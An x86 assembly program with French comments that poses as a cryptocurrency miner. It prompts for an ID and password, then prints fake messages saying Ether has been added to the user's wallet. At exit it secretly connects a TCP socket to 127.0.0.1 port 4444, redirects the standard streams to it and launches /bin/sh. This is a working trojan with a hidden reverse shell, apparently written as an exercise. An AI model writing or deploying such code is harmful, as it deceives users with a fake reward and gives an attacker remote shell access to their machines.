global _start

section .rodata
    stringID db "Veuillez entrer votre ID:", 10, 0
    stringID_len equ $-stringID

    stringMdp db "Veuillez entrer votre mot de passe:", 10, 0
    stringMdp_len equ $-stringMdp

    stringMinage db "Minage en cours, ne pas quitter !!", 10, 0
    stringMinage_len equ $-stringMinage

    stringWin db "Bravo 0,1 Ether (172,29 euros) a été ajouté à votre portefeuille ", 10, 0
    stringWin_len equ $-stringWin

section .data

  timeval:
    tv_sec  dd 0
    tv_usec dd 0

section .bss

    idInput resb 48
    idInput_len equ $-idInput

section .text
    _start:

        jmp begin_minage ; on simule une connexion de l'utilisateur

    begin_minage :

        ;"Veuillez entrer votre ID"
        mov eax, 4 ; syscall write
        mov ebx, 1
        mov ecx, stringID
        mov edx, stringID_len
        int 80h

        ;syscall read
        mov eax, 3
        mov ebx, 0 ; 0 pour stdin
        mov ecx, idInput
        mov edx, idInput_len
        int 80h

        ;"Veuillez entrer votre mot de passe"
        mov eax, 4
        mov ebx, 1
        mov ecx, stringMdp
        mov edx, stringMdp_len
        int 80h

        ;syscall read
        mov eax, 3
        mov ebx, 0
        mov ecx, idInput
        mov edx, idInput_len
        int 80h

        jmp minage

    minage: 

        mov edi, 3 ; On place le compteur a 3 pour avoir 3 occurences dans la boucle
        jmp loopWin

    loopWin:

        ;"Minage en cours, ne pas quitter"
        mov eax, 4 ; syscall write
        mov ebx, 1
        mov ecx, stringMinage
        mov edx, stringMinage_len
        int 80h

        ;syscall time
        mov dword [tv_sec], 5 ; 5 secondes
        mov dword [tv_usec], 0
        mov eax, 162 ; numéro du syscall nano sleep
        mov ebx, timeval
        mov ecx, 0
        int 80h


        ;"0,1 Ether (172,29 euros) a été ajouté à votre portefeuille"
        mov eax, 4
        mov ebx, 1
        mov ecx, stringWin
        mov edx, stringWin_len
        int 80h

        dec edi
        cmp edi, 0
        jg loopWin

        ;"Minage en cours, ne pas quitter"
        mov eax, 4 ; syscall write
        mov ebx, 1
        mov ecx, stringMinage
        mov edx, stringMinage_len
        int 80h

        jmp exit

segment .bss                            ; Segment de l'elf avec les variables non initialisé
    struc sockaddr                      ; Structure data
        sin_family: resw 1              ; 1 pour 2 octets
        sin_port: resw 1        	; 1 car taille du port est de 2 octets
        sin_addr: resd 1                ; 2 car la taille d'une adresse IPv4 est de 4 octets
    endstruc

segment .rodata                         ; Définir les valeures de la structures
    sockaddr_struct_init:
        istruc sockaddr
            at sin_family, dw 0x2       ; dw -> define word (2 octets)
            at sin_port, dw 0x5c11      ; Port 4444 converti en hexa
            at sin_addr, dd 0x100007f   ; dd -> define dword (4 octets), IP 127.0.0.1 converti en hexa
        iend

    binsh db "/bin/sh", 0               ; Définie la châine /bin/sh

exit:
    ;SYS_SOCKET (int family, int type, int protocol)
    mov eax, 359    ; Initialiser un socket
    mov ebx, 0x2    ; AF_INET : TCP, UDP. Famille d'adresse IPv4
    mov ecx, 0x1    ; SOCK_STREAM, FLUX
    mov edx, 0x6    ; Protocole TCP
    int 0x80
    push eax        ; Permet de mettre dans la stack
    jmp _connect_to_socket

_connect_to_socket:
    ;SYS_CONNECT (int fd, struct sockaddr *uservaddr, int addrlen)
    mov eax, 362    ; Appel le syscall connect
    pop ebx         ; Mettre dans le registre ebx
    push ebx        
    mov ecx, sockaddr_struct_init
    mov edx, 0x10
    int 0x80
    jmp _duplicate_file_descriptor_stdin

_duplicate_file_descriptor_stdin:
    mov eax, 63     ; dup2 -> duplique vers les différentes sortie (stdin; stdout, stderr)
    pop ebx
    push ebx
    mov ecx, edi    ; 0 -> valeur int pour stdin
    inc edi	    ; edi = 1
    int 0x80
    jmp _duplicate_file_descriptor_stdout

_duplicate_file_descriptor_stdout:
    mov eax, 63
    pop ebx
    push ebx
    mov ecx, edi    ; 1 -> valeur int pour stdout
    inc edi	    ; edi = 2
    int 0x80
    jmp _duplicate_file_descriptor_stderr

_duplicate_file_descriptor_stderr:
    mov eax, 63
    pop ebx
    push ebx
    mov ecx, edi      ; 2 -> valeur int pour stderr
    int 0x80
    jmp _spawn_shell

_spawn_shell:
    mov eax, 11     ; Appel le syscall execve
    mov ebx, binsh
    xor ecx, ecx    ; mettre à 0 les arguments restant
    xor edx, edx
    int 0x80
